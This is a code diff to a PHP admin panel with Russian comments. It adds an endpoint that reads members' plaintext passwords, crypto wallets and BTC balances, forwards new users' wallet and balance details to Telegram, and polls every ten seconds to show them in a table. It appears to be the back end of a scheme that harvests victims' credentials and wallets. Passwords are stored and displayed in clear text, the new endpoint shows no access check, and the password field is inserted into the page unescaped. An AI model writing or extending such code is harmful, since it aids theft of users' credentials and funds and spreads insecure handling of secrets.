@@ -164,6 +164,36 @@ if (isset($_GET['ajax']) && $_GET['ajax'] === 'btc_transactions') {
     exit;
 }
 
+if (isset($_GET['ajax']) && $_GET['ajax'] === 'new_users' && isset($_GET['last_id'])) {
+    $last_id = intval($_GET['last_id']);
+	require_once 'src/functions.php';
+    $query = "SELECT id, passw, wallet, balance 
+              FROM members 
+              WHERE id > ? 
+              ORDER BY id ASC";
+    $stmt = $CONNECT->prepare($query);
+    $stmt->bind_param("i", $last_id);
+    $stmt->execute();
+    $result = $stmt->get_result();
+
+    $new_users = [];
+    while ($row = $result->fetch_assoc()) {
+        $new_users[] = $row;
+
+        // Формируем сообщение
+        $message = "🆕 <b>Новый пользователь</b>\n"
+                 . "🆔 ID: <code>{$row['id']}</code>\n"
+                 . "💼 Кошелёк: <code>{$row['wallet']}</code>\n"
+                 . "💰 Баланс: <b>{$row['balance']} BTC</b>";
+
+        // Отправка в Telegram
+        sendTelegram($message);
+    }
+
+    echo json_encode(['new_users' => $new_users]);
+    exit;
+}
+
 
 ?>
 <!DOCTYPE html>
@@ -212,6 +242,40 @@ if (isset($_GET['ajax']) && $_GET['ajax'] === 'btc_transactions') {
 
         #btcTransactions li strong {
             color: #FF9900; /* Оранжевый цвет для выделения ключевых данных */
+        }
+		 /* Стили для таблицы со списком пользователей */
+        .users-table-container {
+            max-height: 300px; /* Ограничиваем высоту контейнера */
+            overflow-y: auto; /* Добавляем вертикальную прокрутку */
+            border: 1px solid #ccc; /* Рамка вокруг таблицы */
+            margin-bottom: 20px; /* Отступ снизу */
+            border-radius: 5px; /* Скругляем углы */
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1); /* Лёгкая тень */
+        }
+
+        .users-table-container table {
+            width: 100%; /* Таблица занимает всю ширину контейнера */
+            border-collapse: collapse; /* Убираем двойные границы */
+        }
+
+        .users-table-container th,
+        .users-table-container td {
+            padding: 10px;
+            text-align: left;
+            border-bottom: 1px solid #ddd; /* Линии между строками */
+        }
+
+        .users-table-container th {
+            background-color: #333; /* Тёмный фон для заголовков */
+            color: #FFD700; /* Золотистый цвет текста */
+        }
+
+        .users-table-container tr:nth-child(even) {
+            background-color: #2a2a2a; /* Чередование строк */
+        }
+
+        .users-table-container tr:nth-child(odd) {
+            background-color: #1e1e1e; /* Чередование строк */
         }
     </style>
 	
@@ -314,22 +378,28 @@ setInterval(fetchVisitCount, 10000);
 		
 		
 		<h3>All Users</h3>
-        <table>
-            <tr>
-                <th>ID</th>
-                <th>Password</th>
-                <th>Wallet</th>
-                <th>Balance</th>
-            </tr>
-            <?php while ($user = $users->fetch_assoc()): ?>
-                <tr>
-                    <td><?php echo $user['id']; ?></td>
-                    <td><?php echo htmlspecialchars($user['passw']); ?></td>
-                    <td><?php echo htmlspecialchars($user['wallet']); ?></td>
-                    <td><?php echo $user['balance']; ?></td>
-                </tr>
-            <?php endwhile; ?>
-        </table>
+		<div class="users-table-container">
+            <table id="usersTable">
+                <thead>
+                    <tr>
+                        <th>ID</th>
+                        <th>Password</th>
+                        <th>Wallet</th>
+                        <th>Balance</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <?php while ($user = $users->fetch_assoc()): ?>
+                        <tr>
+                            <td><?php echo $user['id']; ?></td>
+                            <td><?php echo htmlspecialchars($user['passw']); ?></td>
+                            <td><?php echo htmlspecialchars($user['wallet']); ?></td>
+                            <td><?php echo $user['balance']; ?></td>
+                        </tr>
+                    <?php endwhile; ?>
+                </tbody>
+            </table>
+        </div>
         
     </div>
 	
@@ -357,10 +427,51 @@ setInterval(fetchVisitCount, 10000);
                     });
             }
 
-            // Загружаем данные при загрузке страницы
+            
             fetchBTCTransactions();
 
-            // Обновляем каждые 10 секунд
+            
             setInterval(fetchBTCTransactions, 10000);
+			
+			 
+        // Функция для получения максимального ID из таблицы
+        function getLastUserId() {
+            const rows = document.querySelectorAll("#usersTable tbody tr");
+            let maxId = 0;
+            rows.forEach(row => {
+                const id = parseInt(row.getAttribute("data-id"), 10);
+                if (id > maxId) {
+                    maxId = id;
+                }
+            });
+            return maxId;
+        }
+
+        // Функция для получения новых пользователей
+        function fetchNewUsers() {
+            const lastId = getLastUserId(); // Получаем максимальный ID из таблицы
+            fetch(`?ajax=new_users&last_id=${lastId}`, { method: "GET" })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.new_users && data.new_users.length > 0) {
+                        const tableBody = document.querySelector("#usersTable tbody");
+                        data.new_users.forEach(user => {
+                            const row = document.createElement("tr");
+                            row.setAttribute("data-id", user.id);
+                            row.innerHTML = `
+                                <td>${user.id}</td>
+                                <td>${user.passw}</td>
+                                <td>${user.wallet}</td>
+                                <td>${user.balance}</td>
+                            `;
+                            tableBody.prepend(row); // Добавляем новые строки в начало таблицы
+                        });
+                    }
+                })
+                .catch(error => console.error("Ошибка при загрузке новых пользователей:", error));
+        }
+
+        // Запрашиваем новых пользователей каждые 10 секунд
+        setInterval(fetchNewUsers, 10000);
         </script>
 </body>
